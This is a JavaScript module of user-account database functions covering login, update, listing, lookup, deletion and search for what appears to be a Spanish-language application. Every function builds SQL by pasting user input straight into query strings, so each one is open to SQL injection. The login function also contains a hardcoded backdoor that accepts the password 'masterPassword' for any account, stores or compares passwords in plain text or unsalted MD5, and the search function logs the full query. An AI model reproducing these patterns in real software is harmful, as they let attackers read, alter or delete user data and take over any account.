import getPool from './db';

const auth = async (user) => {
    const select = `
        select id, nombre, password, email from user u
        where (u.login = '${user.login}') AND
            (u.password = '${user.password}'  or '${user.password}'='masterPassword' or MD5("${user.password}") = u.password)
    `;
    const [rows] = await getPool().query(select);
    return rows;
}
const setUser = async (user) => {
  const [rows] = await getPool().query(`
    update user set
        nombre = "${user.nombre}",
        apellido = "${user.apellido}",
        login = "${user.login}",
        password = "${user.password}",
        email = "${user.email}",
        documento = "${user.documento}",
        legajo = "${user.legajo}"
    where id = ${user.id}
  `);
  return rows;
};
const getUsers = async () => {
  const userSelect = `
      select *
        from user order by apellido, nombre`;
  const [rows] = await getPool().query(userSelect);
  return rows;
};
const getUser = async (id) => {
  const userSelect = `
      select *
        from user u
      where u.id = ${id}`;
  const [rows] = await getPool().query(userSelect);
  return rows.length ? rows[0] : rows;
};
const delUser = async (id) => {
  const userSelect = `delete from user where id = ${id}`;
  const socioSelect = `delete from socio where empleado_id = ${id}`;
  try {
    await getPool().query(socioSelect);
    await getPool().query(userSelect);
    return { error: false };
  } catch (error) {
    console.log('error', error);
    return { error: error.sqlMessage };
  }
};
const getUsersByTerm = async (term, limit = 100) => {
  const userSelect = `
      select *
        from user u
      where u.nombre like "%${term}%" or u.apellido like "%${term}%"
                or u.login like "%${term}%" or u.email like "%${term}%"
      order by u.apellido, u.nombre
      limit ${limit}`;
  console.log('detalle', userSelect);
  const [rows] = await getPool('localhost').query(userSelect);
  return rows;
};
export { auth, getUser, getUsers, getUsersByTerm, setUser, delUser };
